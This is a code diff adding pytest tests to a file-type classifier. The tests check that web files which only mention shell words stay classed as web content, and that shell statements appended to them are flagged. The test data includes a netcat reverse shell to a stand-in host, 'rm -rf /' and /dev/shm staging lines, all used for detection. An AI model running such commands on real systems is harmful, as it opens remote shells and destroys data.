@@ -168,3 +168,54 @@ def test_other_languages_that_share_a_few_words_with_javascript() -> None:
 def test_the_disguises_alone_are_web_content(disguise: str) -> None:
     kind = identify(DISGUISES[disguise]).kind
     assert kind in WEB_KINDS, (disguise, kind)
+
+
+# Words a shell script uses, in files that are not shell scripts: single words are not enough.
+INNOCENT_WORDS = {
+    "es module with export default and export const": (
+        b'import{a as b}from"./x.js";const c=function(){return b};export const d=2;'
+        b"export default c;export function e(){return d}\n"
+    ),
+    "minified js with echo and bash in strings and names": (
+        b'var echo=function(e){return e},bash="bash -x echo",sh=1;window.q=function(e){return '
+        b"e|sh};window.x=echo(bash);var o={export:1,exports:2,echo:3};\n"
+    ),
+    "html text that mentions bash and export": (
+        b"<!doctype html><html><body><p>Open bash, then export the data and echo it.</p>"
+        b"<button>Export</button></body></html>"
+    ),
+    "css with a charset and a comment about the shell": (
+        b'@charset "utf-8";\n/* styles for the shell, the bash prompt and the export button */\n'
+        b"body{margin:0}.shell{color:#fff}\n"
+    ),
+    "json that names a shell": b'{"command": "echo", "shell": "bash", "export": true}\n',
+    "xml that mentions echo and export": (
+        b'<?xml version="1.0"?><rss version="2.0"><channel><title>echo and export in bash'
+        b"</title></channel></rss>"
+    ),
+}
+
+
+@pytest.mark.parametrize("name", sorted(INNOCENT_WORDS))
+def test_single_shell_words_do_not_make_a_file_a_program(name: str) -> None:
+    kind = identify(INNOCENT_WORDS[name]).kind
+    assert kind in WEB_KINDS, (name, kind)
+
+
+def test_the_same_words_as_statements_are_a_program() -> None:
+    for statement in (
+        b"export PATH=/usr/bin",
+        b"bash -c 'id'",
+        b"x | sh",
+        b"cd /tmp",
+        b"cd /dev/shm",
+        b"nohup ./a &",
+        b"echo a >> /var/tmp/x",
+        b"nc -e /bin/sh 192.0.2.1 4444",
+        b"true; ./a",
+        b"true && ./a",
+        b"rm -rf /",
+    ):
+        for disguise in ("html", "js", "json", "css"):
+            data = DISGUISES[disguise] + b"\n" + statement + b"\n"
+            assert identify(data).kind not in WEB_KINDS, (disguise, statement)
